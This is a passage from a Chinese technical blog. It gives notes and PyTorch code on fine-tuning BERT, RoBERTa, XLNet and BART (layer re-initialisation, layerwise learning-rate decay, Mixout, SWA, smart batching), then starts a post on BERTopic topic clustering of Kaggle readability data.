Layer ...') encoder_temp = getattr(model, _model_type) encoder_temp.pooler.dense.weight.data.normal_(mean=0.0, std=encoder_temp.config.initializer_range) encoder_temp.pooler.dense.bias.data.zero_() for p in encoder_temp.pooler.parameters(): p.requires_grad = True print('Done.!') 对 RoBERTa 的transformer layer进行 Reinitialize 。 RoBERTa 不同于 BERT 在于： 没有 next-sentence pretraining objective ，更改了超参，更大的 batch size 和learning rate 使用 byte level BPE 的 tokenizer 没有 token_type_ids，只需要 用 sep_token 分开不同 sentence。 检查是否被初始化： 1234for layer in model.roberta.encoder.layer[-reinit_layers:]: for module in layer.modules(): if isinstance(module, nn.Linear): print(module.weight.data) 重新初始化 12345678910111213141516171819reinit_layers = 2# TF version uses truncated_normal for initialization. This is Pytorchif reinit_layers &gt; 0: print(f'Reinitializing Last &#123;reinit_layers&#125; Layers ...') encoder_temp = getattr(model, _model_type) for layer in encoder_temp.encoder.layer[-reinit_layers:]: for module in layer.modules(): if isinstance(module, nn.Linear): module.weight.data.normal_(mean=0.0, std=config.initializer_range) if module.bias is not None: module.bias.data.zero_() elif isinstance(module, nn.Embedding): module.weight.data.normal_(mean=0.0, std=config.initializer_range) if module.padding_idx is not None: module.weight.data[module.padding_idx].zero_() elif isinstance(module, nn.LayerNorm): module.bias.data.zero_() module.weight.data.fill_(1.0) print('Done.!') 另外 XLNet 实现方式有些不同 （Transformer-XL）： 123456789101112131415161718192021222324252627reinit_layers = 2if reinit_layers &gt; 0: print(f'Reinitializing Last &#123;reinit_layers&#125; Layers ...') for layer in model.transformer.layer[-reinit_layers :]: for module in layer.modules(): if isinstance(module, (nn.Linear, nn.Embedding)): module.weight.data.normal_(mean=0.0, std=model.transformer.config.initializer_range) if isinstance(module, nn.Linear) and module.bias is not None: module.bias.data.zero_() elif isinstance(module, nn.LayerNorm): module.bias.data.zero_() module.weight.data.fill_(1.0) elif isinstance(module, XLNetRelativeAttention): for param in [ module.q, module.k, module.v, module.o, module.r, module.r_r_bias, module.r_s_bias, module.r_w_bias, module.seg_embed, ]: param.data.normal_(mean=0.0, std=model.transformer.config.initializer_range) print('Done.!') BART，是 seq2seq的结构，\"BERT\"作为encoder，\"GPT\"作为decoder（left-to-right）。采用了多样的噪声预训练方式。 随机token masking 随机token deletion 随机连续tokens替换为一个mask，或者直接插入一个mask 随机打乱文本sentence顺序 将文本序列连成环，随机选择文本开始位置 BART文本理解任务效果可以持平RoBERTa，且适合文本生成任务，而模型大小仅仅比BERT大10%。 12345678910111213reinit_layers = 2_model_type = 'bart'_pretrained_model = 'facebook/bart-base'config = AutoConfig.from_pretrained(_pretrained_model)config.update(&#123;'num_labels':1&#125;)model = AutoModelForSequenceClassification.from_pretrained(_pretrained_model)if reinit_layers &gt; 0: print(f'Reinitializing Last &#123;reinit_layers&#125; Layers ...') for layer in model.model.decoder.layers[-reinit_layers :]: for module in layer.modules(): model.model._init_weights(module) print('Done.!') 实验表明， Re-initialization 对 random seed 更 robust。不建议初始化超过6层的layer，不同任务需要实验找到最好的参数。 Utilizing Intermediate Layers 此部分就是本文第一节 Transformer Representations 的内容。 LLRD - Layerwise Learning Rate Decay 就是 low layer 通用信息，低学习率，top layer 任务相关信息，相对较高学习率。 一种方法是，每层有一个 decay rate 12345678910111213141516171819202122232425262728293031323334353637def get_optimizer_grouped_parameters( model, model_type, learning_rate, weight_decay, layerwise_learning_rate_decay): no_decay = [\"bias\", \"LayerNorm.weight\"] # initialize lr for task specific layer optimizer_grouped_parameters = [ &#123; \"params\": [p for n, p in model.named_parameters() if \"classifier\" in n or \"pooler\" in n], \"weight_decay\": 0.0, \"lr\": learning_rate, &#125;, ] # initialize lrs for every layer num_layers = model.config.num_hidden_layers layers = [getattr(model, model_type).embeddings] + list(getattr(model, model_type).encoder.layer) layers.reverse() lr = learning_rate for layer in layers: lr *= layerwise_learning_rate_decay optimizer_grouped_parameters += [ &#123; \"params\": [p for n, p in layer.named_parameters() if not any(nd in n for nd in no_decay)], \"weight_decay\": weight_decay, \"lr\": lr, &#125;, &#123; \"params\": [p for n, p in layer.named_parameters() if any(nd in n for nd in no_decay)], \"weight_decay\": 0.0, \"lr\": lr, &#125;, ] return optimizer_grouped_parameters 其他方法 见 第三节 Training Strategies 的 Differential / Discriminative Learning Rate 部分。 Mixout Regularization 不同于 Dropout 将神经元以概率p丢弃，Mixout 是将神经元参数以概率 p 替换为预训练模型的参数。意思就是有两组参数，一组来自预训练好的模型，另一组为当前训练的参数。 如图，替换为红色模型的参数。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596# https://github.com/bloodwass/mixoutimport torchimport torch.nn as nnimport torch.nn.init as initimport torch.nn.functional as Ffrom torch.nn import Parameterfrom torch.autograd.function import InplaceFunctionclass Mixout(InplaceFunction): @staticmethod def _make_noise(input): return input.new().resize_as_(input) @classmethod def forward(cls, ctx, input, target=None, p=0.0, training=False, inplace=False): if p &lt; 0 or p &gt; 1: raise ValueError(\"A mix probability of mixout has to be between 0 and 1,\" \" but got &#123;&#125;\".format(p)) if target is not None and input.size() != target.size(): raise ValueError( \"A target tensor size must match with a input tensor size &#123;&#125;,\" \" but got &#123;&#125;\".format(input.size(), target.size()) ) ctx.p = p ctx.training = training if ctx.p == 0 or not ctx.training: return input if target is None: target = cls._make_noise(input) target.fill_(0) target = target.to(input.device) if inplace: ctx.mark_dirty(input) output = input else: output = input.clone() ctx.noise = cls._make_noise(input) if len(ctx.noise.size()) == 1: ctx.noise.bernoulli_(1 - ctx.p) else: ctx.noise[0].bernoulli_(1 - ctx.p) ctx.noise = ctx.noise[0].repeat(input.size()[0], 1) ctx.noise.expand_as(input) if ctx.p == 1: output = target else: output = ((1 - ctx.noise) * target + ctx.noise * output - ctx.p * target) / (1 - ctx.p) return output @staticmethod def backward(ctx, grad_output): if ctx.p &gt; 0 and ctx.training: return grad_output * ctx.noise, None, None, None, None else: return grad_output, None, None, None, Nonedef mixout(input, target=None, p=0.0, training=False, inplace=False): return Mixout.apply(input, target, p, training, inplace)class MixLinear(torch.nn.Module): __constants__ = [\"bias\", \"in_features\", \"out_features\"] # for jit optimization def __init__(self, in_features, out_features, bias=True, target=None, p=0.0): super(MixLinear, self).__init__() self.in_features = in_features self.out_features = out_features self.weight = Parameter(torch.Tensor(out_features, in_features)) if bias: self.bias = Parameter(torch.Tensor(out_features)) else: self.register_parameter(\"bias\", None) self.reset_parameters() self.target = target self.p = p def reset_parameters(self): init.kaiming_uniform_(self.weight, a=math.sqrt(5)) if self.bias is not None: fan_in, _ = init._calculate_fan_in_and_fan_out(self.weight) bound = 1 / math.sqrt(fan_in) init.uniform_(self.bias, -bound, bound) def forward(self, input): return F.linear(input, mixout(self.weight, self.target, self.p, self.training), self.bias) def extra_repr(self): type = \"drop\" if self.target is None else \"mix\" return \"&#123;&#125;=&#123;&#125;, in_features=&#123;&#125;, out_features=&#123;&#125;, bias=&#123;&#125;\".format( type + \"out\", self.p, self.in_features, self.out_features, self.bias is not None ) 使用： 123456789101112131415if mixout &gt; 0: print('Initializing Mixout Regularization') for sup_module in model.modules(): for name, module in sup_module.named_children(): if isinstance(module, nn.Dropout): module.p = 0.0 if isinstance(module, nn.Linear): target_state_dict = module.state_dict() bias = True if module.bias is not None else False new_module = MixLinear( module.in_features, module.out_features, bias, target_state_dict[\"weight\"], mixout ) new_module.load_state_dict(target_state_dict) setattr(sup_module, name, new_module) print('Done.!') Mixout相当于一种自适应的 L2-regularizer ，使得参数变化不会很剧烈。能够提高finetuning稳定性。 Pre-trained Weight Decay 将 weight decay 中，gradient减去的 \\(\\lambda w\\) 变为 \\(\\lambda (w - w^{pretrained})\\)。在Mixout文章中，实验表明这样比普通的 weight decay ，finetuning更稳定。 123456789101112131415161718192021222324252627282930313233343536class PriorWD(Optimizer): def __init__(self, optim, use_prior_wd=False, exclude_last_group=True): super(PriorWD, self).__init__(optim.param_groups, optim.defaults) self.param_groups = optim.param_groups self.optim = optim self.use_prior_wd = use_prior_wd self.exclude_last_group = exclude_last_group self.weight_decay_by_group = [] for i, group in enumerate(self.param_groups): self.weight_decay_by_group.append(group[\"weight_decay\"]) group[\"weight_decay\"] = 0 # w pretrained self.prior_params = &#123;&#125; for i, group in enumerate(self.param_groups): for p in group[\"params\"]: self.prior_params[id(p)] = p.detach().clone() def step(self, closure=None): if self.use_prior_wd: for i, group in enumerate(self.param_groups): for p in group[\"params\"]: if self.exclude_last_group and i == len(self.param_groups): p.data.add_(-group[\"lr\"] * self.weight_decay_by_group[i], p.data) else: # w - w pretrained p.data.add_( -group[\"lr\"] * self.weight_decay_by_group[i], p.data - self.prior_params[id(p)], ) loss = self.optim.step(closure) return loss def compute_distance_to_prior(self, param): assert id(param) in self.prior_params, \"parameter not in PriorWD optimizer\" return (param.data - self.prior_params[id(param)]).pow(2).sum().sqrt() 使用: 12345678910optimizer_grouped_parameters = get_optimizer_grouped_parameters(model, learning_rate, weight_decay)optimizer = AdamW( optimizer_grouped_parameters, lr=learning_rate, eps=adam_epsilon, correct_bias=not use_bertadam)# 修改 optimizeroptimizer = PriorWD(optimizer, use_prior_wd=use_prior_wd) Training Strategies 提升模型速度或准确性的方法： Stochastic Weight Averaging MADGRAD Optimizer Differential / Discriminative Learning Rate Dynamic Padding and Uniform Length Batching Gradient Accumulation Freeze Embedding Numeric Precision Reduction Gradient Checkpointing Stochastic Weight Averaging learning rate schedule经过设计，使得模型在“最优解”附近徘徊，而不是收敛到一点（理论上）。比如75%的时间使用standard decaying learning rate strategy ；而剩下的训练在一个相对较高的constant learning rate上训练。 计算训练最后阶段的滑动平均作为SWA的权重 SWA权重在训练时，不参与计算。计算Batch Normalization的activation statistics时，在训练结束后，单独进行一次 forward pass 得到activation statistics。 所以，有两组权重，一组训练BP，一组计算保存SWA权重。 示例 123456789101112131415161718192021222324from torch.optim.swa_utils import AveragedModel, SWALRfrom torch.optim.lr_scheduler import CosineAnnealingLRloader, optimizer, model, loss_fn = ...swa_start = 5swa_model = AveragedModel(model)swa_scheduler = SWALR(optimizer, swa_lr=0.05)scheduler = CosineAnnealingLR(optimizer, T_max=100)for epoch in range(100): for input, target in loader: optimizer.zero_grad() loss_fn(model(input), target).backward() optimizer.step() if epoch &gt; swa_start: swa_model.update_parameters(model) swa_scheduler.step() else: scheduler.step()# Update bn statistics for the swa_model at the endtorch.optim.swa_utils.update_bn(loader, swa_model)# Use swa_model to make predictions on test data preds = swa_model(test_input) refernce MADGRAD Optimizer AdaGrad派生出的新优化器，在以下任务中表现较好，包括视觉中的分类和图像到图像的任务，以及自然语言处理中的循环和双向掩蔽模型。 但是，weight decay不同于其他，常常设置为0。 learning rate 的设置也和SGD与Adam不同，必要时，先进行一次learning rate查找。 paper 1pip -q install madgrad 另外小数据集上的训练，可以尝试使用RAdam + Lookahead而不是AdamW，效果可能会更好，因为AdamW的warm-up阶段受到数据集大小size的影响。 Differential / Discriminative Learning Rate 模型底层为普遍的字词信息，越往上得到与任务相关的抽象信息。所以 fine-tune 时，对通用层设置较小学习率，越往上学习率相对更大。自定义层学习率单独设置，一般较大。 12345678910111213141516171819202122232425262728293031323334def get_optimizer_params(model, type='unified'): # differential learning rate and weight decay param_optimizer = list(model.named_parameters()) learning_rate = 5e-5 no_decay = ['bias', 'gamma', 'beta'] if type == 'unified': optimizer_parameters = filter(lambda x: x.requires_grad, model.parameters()) elif type == 'module_wise': optimizer_parameters = [ &#123;'params': [p for n, p in model.roberta.named_parameters() if not any(nd in n for nd in no_decay)], 'weight_decay_rate': 0.01&#125;, &#123;'params': [p for n, p in model.roberta.named_parameters() if any(nd in n for nd in no_decay)], 'weight_decay_rate': 0.0&#125;, &#123;'params': [p for n, p in model.named_parameters() if \"roberta\" not in n], 'lr': 1e-3, 'weight_decay_rate':0.01&#125; ] elif type == 'layer_wise': group1=['layer.0.','layer.1.','layer.2.','layer.3.'] group2=['layer.4.','layer.5.','layer.6.','layer.7.'] group3=['layer.8.','layer.9.','layer.10.','layer.11.'] group_all=['layer.0.','layer.1.','layer.2.','layer.3.','layer.4.','layer.5.','layer.6.','layer.7.','layer.8.','layer.9.','layer.10.','layer.11.'] optimizer_parameters = [ &#123;'params': [p for n, p in model.roberta.named_parameters() if not any(nd in n for nd in no_decay) and not any(nd in n for nd in group_all)],'weight_decay_rate': 0.01&#125;, &#123;'params': [p for n, p in model.roberta.named_parameters() if not any(nd in n for nd in no_decay) and any(nd in n for nd in group1)],'weight_decay_rate': 0.01, 'lr': learning_rate/2.6&#125;, &#123;'params': [p for n, p in model.roberta.named_parameters() if not any(nd in n for nd in no_decay) and any(nd in n for nd in group2)],'weight_decay_rate': 0.01, 'lr': learning_rate&#125;, &#123;'params': [p for n, p in model.roberta.named_parameters() if not any(nd in n for nd in no_decay) and any(nd in n for nd in group3)],'weight_decay_rate': 0.01, 'lr': learning_rate*2.6&#125;, &#123;'params': [p for n, p in model.roberta.named_parameters() if any(nd in n for nd in no_decay) and not any(nd in n for nd in group_all)],'weight_decay_rate': 0.0&#125;, &#123;'params': [p for n, p in model.roberta.named_parameters() if any(nd in n for nd in no_decay) and any(nd in n for nd in group1)],'weight_decay_rate': 0.0, 'lr': learning_rate/2.6&#125;, &#123;'params': [p for n, p in model.roberta.named_parameters() if any(nd in n for nd in no_decay) and any(nd in n for nd in group2)],'weight_decay_rate': 0.0, 'lr': learning_rate&#125;, &#123;'params': [p for n, p in model.roberta.named_parameters() if any(nd in n for nd in no_decay) and any(nd in n for nd in group3)],'weight_decay_rate': 0.0, 'lr': learning_rate*2.6&#125;, &#123;'params': [p for n, p in model.named_parameters() if \"roberta\" not in n], 'lr':1e-3, \"momentum\" : 0.99&#125;, ] return optimizer_parameters Strategies: 对于小数据集，复杂的learning rate scheduling strategies（linear with warmup or cosine with warmup etc.）在预训练和finetuning阶段都没什么效果。小数据集，使用简单的scheduling strategies就行。 12345678from transformers import ( get_constant_schedule, get_constant_schedule_with_warmup, get_cosine_schedule_with_warmup, get_cosine_with_hard_restarts_schedule_with_warmup, get_linear_schedule_with_warmup, get_polynomial_decay_schedule_with_warmup) Interpreting Transformers with LIT transfomer可视化工具 Paper: The Language Interpretability Tool: Extensible, Interactive Visualizations and Analysis for NLP Models Blog: The Language Interpretability Tool (LIT): Interactive Exploration and Analysis of NLP Models Official Page: Language Interpretability Tool Examples: GitHub Dynamic Padding and Uniform Length Batching 常规padding策略如上图所示，pad到最大长度。 Dynamic Padding就是每个batch，分别pad到该batch中最长的序列长度。 而Uniform Length Batching，则是将长度相近的序列组合成一个batch。 示例程序 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126import randomimport numpy as npimport multiprocessingimport more_itertoolsimport torchimport torch.nn as nnfrom torch.utils.data import Sampler, Dataset, DataLoaderclass SmartBatchingDataset(Dataset): “tokenize并得到dataloader” def __init__(self, df, tokenizer): super(SmartBatchingDataset, self).__init__() # 这里 df.excerpt 表示dataframe中的文本所在列，使用时需要替换 self._data = ( f\"&#123;tokenizer.bos_token&#125; \" + df.excerpt + f\" &#123;tokenizer.eos_token&#125;\" ).apply(tokenizer.tokenize).apply(tokenizer.convert_tokens_to_ids).to_list() self._targets = None if 'target' in df.columns: self._targets = df.target.tolist() self.sampler = None def __len__(self): return len(self._data) def __getitem__(self, item): if self._targets is not None: return self._data[item], self._targets[item] else: return self._data[item] def get_dataloader(self, batch_size, max_len, pad_id): self.sampler = SmartBatchingSampler( data_source=self._data, batch_size=batch_size ) collate_fn = SmartBatchingCollate( targets=self._targets, max_length=max_len, pad_token_id=pad_id ) dataloader = DataLoader( dataset=self, batch_size=batch_size, sampler=self.sampler, collate_fn=collate_fn, num_workers=(multiprocessing.cpu_count()-1), pin_memory=True ) return dataloader class SmartBatchingSampler(Sampler): “按序列长度排序，得到一组shuffle之后的batch data” def __init__(self, data_source, batch_size): super(SmartBatchingSampler, self).__init__(data_source) self.len = len(data_source) sample_lengths = [len(seq) for seq in data_source] argsort_inds = np.argsort(sample_lengths) self.batches = list(more_itertools.chunked(argsort_inds, n=batch_size)) self._backsort_inds = None def __iter__(self): if self.batches: last_batch = self.batches.pop(-1) np.random.shuffle(self.batches) self.batches.append(last_batch) self._inds = list(more_itertools.flatten(self.batches)) yield from self._inds def __len__(self): return self.len @property def backsort_inds(self): “未shuffle时，batch序列按照长度排序的结果” if self._backsort_inds is None: self._backsort_inds = np.argsort(self._inds) return self._backsort_inds class SmartBatchingCollate: “每个batch分别pad到最大长度，得到attention mask，处理target” def __init__(self, targets, max_length, pad_token_id): self._targets = targets self._max_length = max_length self._pad_token_id = pad_token_id def __call__(self, batch): if self._targets is not None: sequences, targets = list(zip(*batch)) else: sequences = list(batch) input_ids, attention_mask = self.pad_sequence( sequences, max_sequence_length=self._max_length, pad_token_id=self._pad_token_id ) if self._targets is not None: output = input_ids, attention_mask, torch.tensor(targets) else: output = input_ids, attention_mask return output def pad_sequence(self, sequence_batch, max_sequence_length, pad_token_id): max_batch_len = max(len(sequence) for sequence in sequence_batch) max_len = min(max_batch_len, max_sequence_length) padded_sequences, attention_masks = [[] for i in range(2)] attend, no_attend = 1, 0 for sequence in sequence_batch: # 限制model所允许的最大长度 new_sequence = list(sequence[:max_len]) attention_mask = [attend] * len(new_sequence) pad_length = max_len - len(new_sequence) new_sequence.extend([pad_token_id] * pad_length) attention_mask.extend([no_attend] * pad_length) padded_sequences.append(new_sequence) attention_masks.append(attention_mask) padded_sequences = torch.tensor(padded_sequences) attention_masks = torch.tensor(attention_masks) return padded_sequences, attention_masks 使用： 12dataset = SmartBatchingDataset(train, tokenizer)dataloader = dataset.get_dataloader(batch_size=24, max_len=max_len, pad_id=tokenizer.pad_token_id) 已经证明，这种技术不仅显著的减少了训练时间，而且不会减少准确性（在某些情况下甚至提高）。 Freeze Embedding Freezing Embedding Layer of transformers加速训练并节省显存。 一种解释是（看看就好，没有严格证明）：finetuning用的小数据集中，新出现的token会导致原language model中学习好的局部同义词间结构关系被破坏。 12345678910import transformersfrom transformers import AutoConfig, AutoModelForSequenceClassificationfreeze_embedding = Trueconfig = AutoConfig.from_pretrained('roberta-base')model = AutoModelForSequenceClassification.from_pretrained( _pretrained_model, config=config)model.base_model.embeddings.requires_grad_(not freeze_embedding) 这种方法，可以一试，可以用更大的batch size。 Numeric Precision Reduction 混合精度。常见的推理加速方法。 在过去的几年，GPU硬件对float16操作的糟糕支持，意味着降低权重和激活值的精度通常会适得其反，但是NVIDIA Volta和Turing架构与张量核心的引入，意味着现代GPU可以更高效的支持float16运算。 大多数transformer网络都可以简单地转换为float16权值和激活值计算，而没有精度损失。 之所以要保留float32，是因为像softmax这类，计算时有较长的连加运算，这时使用float16可能存在精度损失。 半精度的加速来源于，半精度计算指令本身的速度更快，另外此时可以使用更大的batch size。 开源工具：NVIDIA-apex；torch.cuda.amp--相比AMP，使用更灵活一些，但是用起来都差不多。 注意：小batch size时，混合精度会由于频繁IO导致的时间损失大于小batch的半精度训练所节省的时间。 示例 Gradient Accumulation 就是累计梯度几个轮次，然后进行一次参数更新。 示例程序 1234567891011optimizer.zero_grad() # Reset gradients tensorsfor i, (inputs, labels) in enumerate(training_set): predictions = model(inputs) # Forward pass loss = loss_function(predictions, labels) # Compute loss function loss = loss / accumulation_steps # Normalize our loss (if averaged) loss.backward() # Backward pass if (i+1) % accumulation_steps == 0: # Wait for several backward steps optimizer.step() # Now we can do an optimizer step optimizer.zero_grad() # Reset gradients tensors if (i+1) % evaluation_steps == 0: # Evaluate the model when we... evaluate_model() # ...have no gradients accumulated 如果我们的损失是在训练样本上平均的，我们还需要除以积累步骤的数量。 Gradient Checkpointing 以时间为代价，节省GPU内存。 通过将模型分为不同的段，每个段计算时，分别进行计算，将当前段计算结果传给下一个段后，当前段的中间状态都不会保存。 示例 PyTorch Checkpoint多GPU优化 其他开源工具 DeepSpeed FairScale Accelerate Some Exp 讲实话小样集的比赛，是个调参游戏，对于回归任务，更是如此。结构上玩出花，效果反而不好。优化方法上，常见的FGM和SWA对于一些回归任务，基本没啥效果提升。没有尝试过对比学习，可能这是一个好方法。 比赛中对于这类强学习模型，还是最好bagging，降降variance。 只把BERT这些庞然大物当做特征抽取器，然后用传统ML算法来学习，会是更方便快捷的方法，而且实践上也确实可行，只是很容易过拟合，BERT特征还是太强了（当然这取决于如何训练和训练的程度）。这可能更快，但是得到好结果需要一些“运气”，还有一点直觉。 对于比赛而言，large模型得到好结果还是容易一些，就像好多论文，其实方法就那样，主要BERT 类模型用large调得好，也容易出好结果。可解释的余地还是太差了。各部分又几乎是关联的，耦合在一起，所以算了。 好的算法，不应该是亿级参数对数据的变相记忆，那是“数据库”的加权求和与激活函数筛选。让人感觉失望。这里的一面之词是，大模型，总是“不太好”。可是，效果有了，很多时候，还是会真香。 NLP Tutorial The Super Duper NLP Repo Huggingface Community Hugging Face’s notebooks reference： kaggle rhtsingh REVISITING FEW-SAMPLE BERT FINE-TUNING ON THE STABILITY OF FINE-TUNING BERT SMART: Robust and Efficient Fine-Tuning for Pre-trained Natural Language Models Fine-Tuning Pretrained Language Models:Weight Initializations, Data Orders, and Early Stopping MIXOUT: EFFECTIVE REGULARIZATION TO FINETUNE LARGE-SCALE PRETRAINED LANGUAGE MODELS How to Fine-Tune BERT for Text Classification? Sentence Encoders on STILTs: Supplementary Training on Intermediate Labeled-data Tasks","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"NLP","slug":"Notes/NLP","permalink":"https://racleray.github.io/categories/Notes/NLP/"}],"tags":[{"name":"BERT","slug":"BERT","permalink":"https://racleray.github.io/tags/BERT/"}]},{"title":"BERT_topic_analysis","slug":"BERT-topic-analysis","date":"2021-07-19T14:26:37.000Z","updated":"2023-08-07T11:54:31.026Z","comments":true,"path":"posts/c228cec2.html","link":"","permalink":"https://racleray.github.io/posts/c228cec2.html","excerpt":"简单学习下BERT Topic Analysis的相关内容，看看Kaggle上的代码实验。","text":"运行 Colab Connect to kaggle 12345678!pip install --user kaggle!mkdir /root/.kaggle!mv /content/kaggle.json /root/.kaggle/kaggle.json!kaggle competitions download -c commonlitreadabilityprize!ls 123456import osfor filename in os.listdir('.'): if filename.endswith('.zip'): os.system(\"unzip &#123;&#125;\".format(filename)) os.system(\"rm &#123;&#125;\".format(filename)) Visualization with Bokeh 123456789!pip install --upgrade pip!pip install --upgrade numpy!pip install --upgrade sentence_transformers!conda install -c conda-forge hdbscan --y!pip install bokeh!pip install --upgrade bertopic[visualization]# !pip uninstall numpy# !pip install numpy 1234567891011121314151617181920212223from bertopic import BERTopicimport pandas as pdfrom sentence_transformers import SentenceTransformerimport sklearn.manifoldimport umapimport numpy as npimport pandas as pdimport randomfrom nltk.corpus import stopwordsrandom.seed(42)from bokeh.io import output_file, showfrom bokeh.models import ColumnDataSource, HoverTool, LinearColorMapperfrom bokeh.palettes import plasma, d3, Turbo256from bokeh.plotting import figurefrom bokeh.transform import transformimport bokeh.iobokeh.io.output_notebook()import bokeh.plotting as bplimport bokeh.models as bmobpl.output_notebook() 读取数据 123456789101112test = pd.read_csv('test.csv')train = pd.read_csv('train.csv')train['set'] = 'train'test['set'] = 'test'combined = pd.concat([train, test], ignore_index=True)combined.target.fillna(3, inplace=True)texts = combined.excerpt.values.tolist()targets = combined.target.values.tolist()sets = combined.set.values.tolist() 文本处理（可选） 123456789101112131415161718192021222324252627282930313233343536373839# def preprocess_tweet_data(data,name):# # Lowering the case of the words in the sentences# data[name]=data[name].str.lower()# # Code to remove the Hashtags from the text# data[name]=data[name].apply(lambda x:re.sub(r'\\B#\\S+','',x))# # Code to remove the links from the text# data[name]=data[name].apply(lambda x:re.sub(r\"http\\S+\", \"\", x))# # Code to remove the Special characters from the text # data[name]=data[name].apply(lambda x:' '.join(re.findall(r'\\w+', x)))# # Code to substitute the multiple spaces with single spaces# data[name]=data[name].apply(lambda x:re.sub(r'\\s+', ' ', x, flags=re.I))# # Code to remove all the single characters in the text# data[name]=data[name].apply(lambda x:re.sub(r'\\s+[a-zA-Z]\\s+', '', x))# # Remove the twitter handlers# data[name]=data[name].apply(lambda x:re.sub('@[^\\s]+','',x))def preprocess(data): excerpt_processed=[] for e in data['excerpt']: # find alphabets e = re.sub(\"[^a-zA-Z]\", \" \", e) e = re.sub(r'\\s+', ' ', e, flags=re.I) # # convert to lower case # e = e.lower() # tokenize words e = nltk.word_tokenize(e) # remove stopwords e = [word for word in e if not word.lower() in set(stopwords.words(\"english\"))] # lemmatization lemma = nltk.WordNetLemmatizer() e = [lemma.lemmatize(word) for word in e] e=\" \".join(e) excerpt_processed.append(e) return excerpt_processed 使用sentence bert计算文档向量 1model = SentenceTransformer('stsb-distilbert-base') id1embeddings = model.encode(texts) 降维 t-SNE 与 umap t-SNE保留数据中局部结构。 UMAP保留数据中的本地和大部分全局结构。 UMAP比tSNE要快得多，当面对更多数据、更高维数据时 12color_mapper = LinearColorMapper(palette='Plasma256', low=min(targets), high=max(targets))out = sklearn.manifold.TSNE(n_components=2).fit_transform(embeddings) 绘制Boken。test set标签设置为3。 123456789101112131415161718192021SETS = ['train', 'test']MARKERS = ['circle', 'triangle']list_x = out[:,0]list_y = out[:,1]desc = textssource = ColumnDataSource(data=dict(x=list_x, y=list_y, desc=desc, targets=targets, dset=sets))hover = HoverTool(tooltips=[ (\"index\", \"$index\"), (\"(x,y)\", \"(@x, @y)\"), ('desc', '@desc'), ('targets', '@targets'), ('dset', '@dset')])p = figure(plot_width=800, plot_height=800, tools=[hover], title=\"First Look at the Data\")p.scatter('x', 'y', size=10, source=source, legend='dset', color=&#123;'field': 'targets', 'transform': color_mapper&#125;, marker=bokeh.transform.factor_mark('dset', MARKERS, SETS),)bpl.show(p) 12umap_model = umap.UMAP(n_neighbors=15, n_components=2, metric='cosine')out_umap = umap_model.fit_transform(embeddings) 123456789101112131415161718192021SETS = ['train', 'test']MARKERS = ['circle', 'triangle']list_x = out_umap[:,0]list_y = out_umap[:,1]desc = textssource = ColumnDataSource(data=dict(x=list_x, y=list_y, desc=desc, targets=targets, dset=sets))hover = HoverTool(tooltips=[ (\"index\", \"$index\"), (\"(x,y)\", \"(@x, @y)\"), ('desc', '@desc'), ('targets', '@targets'), ('dset', '@dset')])p = figure(plot_width=800, plot_height=800, tools=[hover], title=\"First Look at the Data\")p.scatter('x', 'y', size=10, source=source, legend='dset', color=&#123;'field': 'targets', 'transform': color_mapper&#125;, marker=bokeh.transform.factor_mark('dset', MARKERS, SETS),)bpl.show(p) Kmeans 观察数据 12345from sklearn.decomposition import PCAfrom sklearn.cluster import MiniBatchKMeansfrom sklearn.metrics import silhouette_samples, silhouette_scoreimport matplotlib.pyplot as pltimport matplotlib.cm as cm 1234567891011121314151617def find_optimal_clusters(data, max_k): iters = range(2, max_k+1, 1) sse = [] # 轮廓系数 for k in iters: cluster = MiniBatchKMeans(n_clusters=k, init_size=256, batch_size=512, random_state=20).fit(data) silhouette_avg = silhouette_score(data, cluster.labels_) sse.append(silhouette_avg) print('Fit &#123;&#125; clusters'.format(k)) f, ax = plt.subplots(1, 1) ax.plot(iters, sse, marker='o') ax.set_xlabel('Cluster Centers') ax.set_xticks(iters) ax.set_xticklabels(iters) ax.set_ylabel('SSE') ax.set_title('SSE by Cluster Center Plot') colab1find_optimal_clusters(embeddings, 20) 1clusters_2 = MiniBatchKMeans(n_clusters=2, init_size=256, batch_size=512, random_state=20).fit_predict(embeddings) 1234567891011121314151617181920212223242526def plot_tsne_pca_umap(data, labels): max_label = max(labels)+1 max_items = np.random.choice(range(data.shape[0]), size=2700, replace=False) # reducer = umap.UMAP(n_components=2) pca = PCA(n_components=2).fit_transform(data[max_items,:]) tsne = sklearn.manifold.TSNE(n_components=2).fit_transform(embeddings) uma = umap.UMAP(n_components=2).fit_transform(embeddings) idx = np.random.choice(range(pca.shape[0]), size=320, replace=False) label_subset = labels[max_items] label_subset = [cm.hsv(i/max_label) for i in label_subset[idx]] f, ax = plt.subplots(1, 3, figsize=(14, 6)) ax[0].scatter(pca[idx, 0], pca[idx, 1], c=label_subset) ax[0].set_title('PCA Cluster Plot') ax[1].scatter(tsne[idx, 0], tsne[idx, 1], c=label_subset) ax[1].set_title('TSNE Cluster Plot') ax[2].scatter(uma[idx,0],uma[idx,1],c=label_subset) ax[2].set_title('UMAP Cluster Plot') plot_tsne_pca_umap(embeddings, clusters_2) Topic BERT topic BERTopic依赖于句子嵌入和聚类算法，以及降维，生成文档主题簇。 12model = BERTopic(language=\"english\", min_topic_size=20)topics, probs = model.fit_transform(texts) 12345678topic_words = ['-1: outlier']for i in range(len(set(topics))-1): tpc = model.get_topic(i)[:8] words = [x[0] for x in tpc] tw = ' '.join([str(i) + ':'] + words) topic_words.append(tw)exp_topics = [topic_words[x+1] for x in topics] 1len(set(topics)) 1234567891011121314151617181920212223242526clrs = random.sample(Turbo256, len(set(topics)))color_map = bmo.CategoricalColorMapper(factors=topic_words, palette=clrs)list_x = out[:,0]list_y = out[:,1]desc = textssource = ColumnDataSource(data=dict(x=list_x, y=list_y, desc=desc, topic=exp_topics, target=targets, dset=sets,))hover = HoverTool(tooltips=[ (\"index\", \"$index\"), ('desc', '@desc'), ('topic', '@topic'), ('target', '@target'), ('dset', '@dset'),])p = figure(plot_width=800, plot_height=800, tools=[hover], title=\"Topics from BERTopic model\")p.scatter('x', 'y', size=10, source=source, fill_color=transform('topic', color_map), marker=bokeh.transform.factor_mark('dset', MARKERS, SETS), legend='dset')# p.legend.location = \"top_left\"# p.legend.click_policy=\"hide\"bokeh.plotting.show(p) 123456789101112topic_df = model.get_topic_freq()def get_keywords(i): 